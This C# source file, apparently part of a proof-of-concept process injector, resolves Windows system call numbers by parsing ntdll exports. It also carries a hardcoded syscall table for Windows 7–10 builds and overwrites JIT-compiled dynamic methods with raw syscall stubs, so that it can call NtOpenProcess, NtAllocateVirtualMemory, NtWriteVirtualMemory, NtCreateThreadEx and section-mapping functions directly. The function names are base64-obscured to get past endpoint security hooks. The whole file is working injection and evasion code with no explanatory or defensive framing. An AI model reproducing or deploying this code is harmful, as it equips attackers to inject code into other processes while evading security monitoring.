using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Collections;
using static directInjectorPOC.native;
using System.Collections.Generic;
using System.Reflection.Emit;
using System.Reflection;
using System.Text;

namespace directInjectorPOC
{
    class syscalls
    {

        public static byte NtOpenProcess_ssn;
        public static byte NtCreateThreadEx_ssn;
        public static byte NtWriteVirtualMemory_ssn;
        public static byte NtAllocateVirtualMemory_ssn;
        public static byte NtCreateSection_ssn;
        public static byte NtMapViewOfSection_ssn;

        public static IntPtr RVA2VA(IntPtr dll_base_address, int offset)
        {
            return IntPtr.Add(dll_base_address, offset);
        }
        public static string hash_me(string func_name)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(func_name));
        }

        static syscalls()
        {

            System.Diagnostics.ProcessModuleCollection all_pm = Process.GetCurrentProcess().Modules;
            ProcessModule pm_ntdll = null;
            for (int i = 0; i < all_pm.Count; i++)
            {
                if (all_pm[i].ModuleName == "ntdll.dll")
                {
                    pm_ntdll = all_pm[i];
                    break;
                }
            }

            if (pm_ntdll == null)
            {
                Console.WriteLine("[*] Cant find NTDLL.dll, exiting.");
                Environment.Exit(0);
            }

            //getting ntdll content for parsing
            byte[] ntdll = new byte[pm_ntdll.ModuleMemorySize];
            IntPtr ntdll_base_add = pm_ntdll.BaseAddress;
            Marshal.Copy(ntdll_base_add, ntdll, 0, pm_ntdll.ModuleMemorySize);


            //parse pe headers until we get _IMAGE_EXPORT_DIRECTORY
            native.IMAGE_DOS_HEADER image_dos_header = (native.IMAGE_DOS_HEADER)Marshal.PtrToStructure(ntdll_base_add, typeof(native.IMAGE_DOS_HEADER));

            IntPtr img_file_header = RVA2VA(ntdll_base_add, (int)image_dos_header.e_lfanew + sizeof(UInt32));
            native.IMAGE_FILE_HEADER img_f_h = (native.IMAGE_FILE_HEADER)Marshal.PtrToStructure(img_file_header, typeof(native.IMAGE_FILE_HEADER));

            IntPtr optional_64_header = RVA2VA(img_file_header, Marshal.SizeOf(new native.IMAGE_FILE_HEADER()));
            native.IMAGE_OPTIONAL_HEADER64 header_op64 = (native.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(optional_64_header, typeof(native.IMAGE_OPTIONAL_HEADER64));

            IntPtr export_directory_ptr = RVA2VA(ntdll_base_add, (int)header_op64.ExportTable.VirtualAddress);

            native._IMAGE_EXPORT_DIRECTORY image_export_directory = (native._IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(export_directory_ptr, typeof(native._IMAGE_EXPORT_DIRECTORY));

            //get pointers to AddressOfNameOrdinals, AddressOfNames and AddressOfFunctions tables.
            IntPtr ordinals = RVA2VA(ntdll_base_add, (int)image_export_directory.AddressOfNameOrdinals);
            IntPtr names = RVA2VA(ntdll_base_add, (int)image_export_directory.AddressOfNames);
            IntPtr functions = RVA2VA(ntdll_base_add, (int)image_export_directory.AddressOfFunctions);

            int n_entry = 0;
            //create 
            syscall_entry[] all_functions = new syscall_entry[image_export_directory.NumberOfNames];
            while (image_export_directory.NumberOfNames > 0)
            {
                int rva_tmp = Marshal.ReadInt32(names, 4 * n_entry);
                IntPtr string_ptr = RVA2VA(ntdll_base_add, rva_tmp);
                int ordinal_n = Marshal.ReadInt16(ordinals, 2 * n_entry);
                rva_tmp = Marshal.ReadInt32(functions, 4 * ordinal_n);

                string current_name = Marshal.PtrToStringAnsi(string_ptr);
                all_functions[n_entry].hash = hash_me(current_name);
                all_functions[n_entry].rva = (uint)rva_tmp; ;
                n_entry++;
                --image_export_directory.NumberOfNames;
            }
            //filter only Zw functions
            syscall_entry[] all_syscalls = Array.FindAll(all_functions, current => current.hash.ToString().Substring(0, 3) == "Wnd");
            //sort by func addrr
            Array.Sort(all_syscalls, delegate (syscall_entry x, syscall_entry y) { return x.rva.CompareTo(y.rva); });

            //syscall_entry[] all_syscalls = parse_ssn_sorting();
            //parse the exports of the loaded ntdll
            ProcessModuleCollection c = Process.GetCurrentProcess().Modules;
            for(int i = 0; i < all_syscalls.Length; i++)
            {
                switch (all_syscalls[i].hash)
                {
                    //
                    case "WndPcGVuUHJvY2Vzcw==":
                        NtOpenProcess_ssn = Convert.ToByte(i);
                        break;
                    case "WndDcmVhdGVUaHJlYWRFeA==":
                        NtCreateThreadEx_ssn = Convert.ToByte(i);
                        break;
                    case "WndXcml0ZVZpcnR1YWxNZW1vcnk=":
                        NtWriteVirtualMemory_ssn = Convert.ToByte(i);
                        break;
                    case "WndBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=":
                        NtAllocateVirtualMemory_ssn = Convert.ToByte(i);
                        break;
                    case "WndDcmVhdGVTZWN0aW9u":
                        NtCreateSection_ssn = Convert.ToByte(i);
                        break;
                    case "WndNYXBWaWV3T2ZTZWN0aW9u":
                        NtMapViewOfSection_ssn = Convert.ToByte(i);
                        break;

                }
            }
        }

        public static byte[] syscallSkeleton = { 0x49, 0x89, 0xCA, 0xB8, 0xFF, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
        public static Dictionary<string, Dictionary<string, byte>> sysDic = new Dictionary<string, Dictionary<string, byte>>()
        {
            { "win10-1507", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB3},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1511", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB4},
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1607", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB6},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1703", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB9},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1709", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBA},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1803", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBB},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1809", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBC},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1903-9", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xC1},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win8-12", new Dictionary<string, byte>()
                {
                    { "openprocess",0x24},
                    { "allocatevirtualmem", 0x16},
                    { "writevirtualmem", 0x38},
                    { "createremthread", 0xAF},
                    { "createsection", 0x48 },
                    { "mapviewofsec", 0x26 }
                }
            },
            { "win8.1-12r2", new Dictionary<string, byte>()
                {
                    { "openprocess",0x25},
                    { "allocatevirtualmem", 0x17},
                    { "writevirtualmem", 0x39},
                    { "createremthread", 0xB0},
                    { "createsection", 0x49 },
                    { "mapviewofsec", 0x27 }
                }
            },
            { "w7-08", new Dictionary<string, byte>()
                {
                    { "openprocess",0x23},
                    { "allocatevirtualmem", 0x15},
                    { "writevirtualmem", 0x37},
                    { "createremthread", 0xA5},
                    { "createsection", 0x47 },
                    { "mapviewofsec", 0x25 }
                }
            }
        };

        public unsafe static IntPtr getAdrressWithMSIL(byte[] syscall)
        {
            //begin memcopy en msil
            AppDomain app_domain = AppDomain.CurrentDomain;
            AssemblyName assembly_name = new AssemblyName("MethodSmasher");
            AssemblyBuilder assembly_builder = app_domain.DefineDynamicAssembly(assembly_name, AssemblyBuilderAccess.Run);
            AllowPartiallyTrustedCallersAttribute attributes = new AllowPartiallyTrustedCallersAttribute();
            ConstructorInfo constructor_info = attributes.GetType().GetConstructors()[0];
            object[] obj_array = new object[0];
            CustomAttributeBuilder custom_attr_builder = new CustomAttributeBuilder(constructor_info, obj_array);
            assembly_builder.SetCustomAttribute(custom_attr_builder);
            ModuleBuilder module_builder = assembly_builder.DefineDynamicModule("MethodSmasher");
            UnverifiableCodeAttribute unv_code_attribute = new UnverifiableCodeAttribute();
            constructor_info = unv_code_attribute.GetType().GetConstructors()[0];
            CustomAttributeBuilder modCAttrB = new CustomAttributeBuilder(constructor_info, obj_array);
            module_builder.SetCustomAttribute(modCAttrB);
            TypeBuilder type_builder = module_builder.DefineType("MethodSmasher", TypeAttributes.Public);
            Type[] all_params = { typeof(IntPtr), typeof(IntPtr), typeof(Int32) };
            MethodBuilder method_builder = type_builder.DefineMethod("OverwriteMethod", MethodAttributes.Public | MethodAttributes.Static, null, all_params);
            ILGenerator generator = method_builder.GetILGenerator();

            generator.Emit(OpCodes.Ldarg_0);
            generator.Emit(OpCodes.Ldarg_1);
            generator.Emit(OpCodes.Ldarg_2);
            generator.Emit(OpCodes.Volatile);
            generator.Emit(OpCodes.Cpblk);
            generator.Emit(OpCodes.Ret);

            var smasher_type = type_builder.CreateType();
            var overwrite_method = smasher_type.GetMethod("OverwriteMethod");
            //end memcopy en msil

            //begin xor dummy method
            app_domain = AppDomain.CurrentDomain;
            assembly_name = new AssemblyName("SmashMe");
            assembly_builder = app_domain.DefineDynamicAssembly(assembly_name, AssemblyBuilderAccess.Run);
            attributes = new AllowPartiallyTrustedCallersAttribute();
            constructor_info = attributes.GetType().GetConstructors()[0];
            obj_array = new object[0];
            custom_attr_builder = new CustomAttributeBuilder(constructor_info, obj_array);
            assembly_builder.SetCustomAttribute(custom_attr_builder);
            module_builder = assembly_builder.DefineDynamicModule("SmashMe");
            unv_code_attribute = new UnverifiableCodeAttribute();
            constructor_info = unv_code_attribute.GetType().GetConstructors()[0];
            modCAttrB = new CustomAttributeBuilder(constructor_info, obj_array);
            module_builder.SetCustomAttribute(modCAttrB);
            type_builder = module_builder.DefineType("SmashMe", TypeAttributes.Public);
            Int32 xorK = 0x41424344;
            Type[] allParams2 = { typeof(Int32) };
            method_builder = type_builder.DefineMethod("OverwriteMe", MethodAttributes.Public | MethodAttributes.Static, typeof(Int32), allParams2);
            generator = method_builder.GetILGenerator();
            generator.DeclareLocal(typeof(Int32));
            generator.Emit(OpCodes.Ldarg_0);

            for (var x = 0; x < 13000; x++)
            {
                generator.Emit(OpCodes.Ldc_I4, xorK);
                generator.Emit(OpCodes.Xor);
                generator.Emit(OpCodes.Stloc_0);
                generator.Emit(OpCodes.Ldloc_0);
            }

            generator.Emit(OpCodes.Ldc_I4, xorK);
            generator.Emit(OpCodes.Xor);
            generator.Emit(OpCodes.Ret);

            var smashme_type = type_builder.CreateType();
            var overwrite_me_method = smashme_type.GetMethod("OverwriteMe");
            //end xor dummy method

            //jit the xor method
            for (var x = 0; x < 40; x++)
            {
                try
                {
                    var i = overwrite_me_method.Invoke(null, new object[] { 0x11112222 });
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        string err = e.InnerException.Message;
                    }
                }
            }

            byte[] trap;


            if (IntPtr.Size == 4)
            {
                //32bits shcode
                trap = new byte[] { 0x90 };
            }
            else
            {
                //64bits shcode
                trap = new byte[] { 0x90 };
            }

            IntPtr syscall_address = Marshal.AllocHGlobal(syscall.Length);

            Marshal.Copy(syscall, 0, syscall_address, syscall.Length);

            IntPtr target_method_addr = getMethodAddress(overwrite_me_method);

            object[] owParams = new object[] { target_method_addr, syscall_address, syscall.Length };
            try
            {
                overwrite_method.Invoke(null, owParams);
            }
            catch (Exception e)
            {
                if (e.InnerException != null)
                {
                    string err = e.InnerException.Message;
                }
            }

            return target_method_addr;    
        }

        public static IntPtr getMethodAddress(MethodInfo minfo)
        {

            IntPtr retAd = new IntPtr();
            Type typeBuilded;

            if (minfo.GetMethodImplementationFlags() == MethodImplAttributes.InternalCall)
            {
                return IntPtr.Zero;
            }

            try
            {
                typeBuilded = Type.GetType("MethodLeaker", true);
            }
            catch
            {
                AppDomain appD = AppDomain.CurrentDomain;
                AssemblyName assName = new AssemblyName("MethodLeakAssembly");
                AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
                ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodLeakModule");
                TypeBuilder tBuilder = mBuilder.DefineType("MethodLeaker", TypeAttributes.Public);

                MethodBuilder metBuilder;
                if (IntPtr.Size == 4)
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);

                }
                else
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);
                }

                ILGenerator ilGen = metBuilder.GetILGenerator();

                ilGen.Emit(OpCodes.Ldftn, minfo);
                ilGen.Emit(OpCodes.Ret);

                typeBuilded = tBuilder.CreateType();
            }
            MethodInfo methodInfoBuilded = typeBuilded.GetMethod("LeakMethod");
            try
            {
                var obj = methodInfoBuilded.Invoke(null, null);
                retAd = (IntPtr)obj;
            }
            catch (Exception e)
            {
                Console.WriteLine(methodInfoBuilded.Name + " cannot return an unmanaged address.");
            }
            return retAd;
        }

        public static NTSTATUS NtOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = NtOpenProcess_ssn; 

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtOpenProcess_delegate myAssemblyFunction = (Delegates.NtOpenProcess_delegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtOpenProcess_delegate));

            return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
        }

        public static NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = NtCreateThreadEx_ssn;

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtCreateThreadEx_delegate myAssemblyFunction = (Delegates.NtCreateThreadEx_delegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx_delegate));

            return (NTSTATUS)myAssemblyFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);

        }

        public static NTSTATUS NtWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = NtWriteVirtualMemory_ssn;

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtWriteVirtualMemory_delegate myAssemblyFunction = (Delegates.NtWriteVirtualMemory_delegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory_delegate));

            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
        }


        public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = NtAllocateVirtualMemory_ssn;

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtAllocateVirtualMemory_delegate myAssemblyFunction = (Delegates.NtAllocateVirtualMemory_delegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory_delegate));

            return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
        }

        public static NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = NtCreateSection_ssn;

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtCreateSection_delegate myAssemblyFunction = (Delegates.NtCreateSection_delegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateSection_delegate));

            return (NTSTATUS)myAssemblyFunction(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
        }

        public static NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = NtMapViewOfSection_ssn;

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtMapViewOfSection_delegate myAssemblyFunction = (Delegates.NtMapViewOfSection_delegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtMapViewOfSection_delegate));

            return (NTSTATUS)myAssemblyFunction(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
        }

        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtOpenProcess_delegate(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtWriteVirtualMemory_delegate(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtAllocateVirtualMemory_delegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateThreadEx_delegate(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateSection_delegate(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtMapViewOfSection_delegate(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);


        }
    }
}
